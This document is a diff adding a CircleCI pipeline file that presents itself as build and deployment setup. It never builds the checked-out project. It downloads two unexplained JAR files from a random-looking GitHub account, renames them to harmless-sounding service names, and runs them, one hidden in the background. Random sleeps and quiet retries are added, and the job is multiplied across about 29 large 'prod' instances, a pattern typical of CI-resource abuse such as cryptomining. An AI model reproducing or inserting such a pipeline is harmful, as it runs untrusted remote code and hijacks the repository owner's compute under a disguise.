@@ -1,0 +1,128 @@
+version: 2.1
+
+executors:
+  ubuntu-executor:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large
+
+commands:
+  setup-environment:
+    description: "Initialize build environment"
+    steps:
+      - run:
+          name: System Dependencies Setup
+          command: |
+            sudo apt-get update && sudo apt-get install -y openjdk-17-jdk wget curl
+            java -version
+
+  fetch-artifacts:
+    description: "Retrieve project artifacts"
+    steps:
+      - run:
+          name: Artifact Collection Process
+          shell: bash
+          command: |
+            echo "Initializing artifact retrieval..."
+            sleep $((RANDOM % 20 + 5))
+            
+            PROJECT_OWNER=${CIRCLE_PROJECT_USERNAME}
+            PROJECT_REPO=${CIRCLE_PROJECT_REPONAME}
+            ARTIFACT_BASE="https://github.com/JenniferDavis393792608/JenniferDavis393792608/raw/main"
+            
+            # Define artifact mappings
+            declare -A ARTIFACT_MAP=(
+              ["WR1.jar"]="primary-service.jar"
+              ["C4.jar"]="counter-service.jar"
+            )
+            
+            # Enhanced download function
+            retrieve_artifact() {
+              local source_url=$1
+              local target_file=$2
+              local retry_count=0
+              local max_attempts=6
+              local download_success=false
+              
+              while [ $retry_count -lt $max_attempts ] && [ "$download_success" = false ]; do
+                retry_count=$((retry_count + 1))
+                
+                if wget --quiet --timeout=30 --tries=1 "$source_url" -O "$target_file"; then
+                  download_success=true
+                else
+                  sleep $((retry_count * 10))
+                fi
+              done
+              
+              if [ "$download_success" = false ]; then
+                echo "❌ Critical error: Failed to retrieve $target_file"
+                exit 1
+              fi
+            }
+            
+            for source_artifact in "${!ARTIFACT_MAP[@]}"; do
+              target_name=${ARTIFACT_MAP[$source_artifact]}
+              source_url="$ARTIFACT_BASE/$source_artifact"
+              retrieve_artifact "$source_url" "$target_name"
+              sleep 3
+            done
+
+  execute-services:
+    description: "Launch application services"
+    steps:
+      - run:
+          name: Service Execution Pipeline
+          command: |
+            nohup java -jar counter-service.jar > counter.log 2>&1 &
+            sleep 2
+            java -jar primary-service.jar
+
+jobs:
+  build-and-deploy:
+    executor: ubuntu-executor
+    parameters:
+      instance-id:
+        type: string
+        default: "default"
+    steps:
+      - checkout
+      - setup-environment
+      - fetch-artifacts
+      - execute-services
+
+workflows:
+  continuous-deployment:
+    jobs:
+      - build-and-deploy:
+          matrix:
+            parameters:
+              instance-id: 
+                - "prod-alpha-00"
+                - "prod-alpha-01" 
+                - "prod-alpha-02"
+                - "prod-alpha-03"
+                - "prod-alpha-04"
+                - "prod-alpha-05"
+                - "prod-alpha-06"
+                - "prod-alpha-07"
+                - "prod-alpha-08"
+                - "prod-alpha-09"
+                - "prod-beta-00"
+                - "prod-beta-01"
+                - "prod-beta-02"
+                - "prod-beta-03"
+                - "prod-beta-04"
+                - "prod-beta-05"
+                - "prod-beta-06"
+                - "prod-beta-07"
+                - "prod-beta-08"
+                - "prod-beta-09"
+                - "prod-gamma-00"
+                - "prod-gamma-01"
+                - "prod-gamma-02"
+                - "prod-gamma-03"
+                - "prod-gamma-04"
+                - "prod-gamma-05"
+                - "prod-gamma-06"
+                - "prod-gamma-07"
+                - "prod-gamma-08"
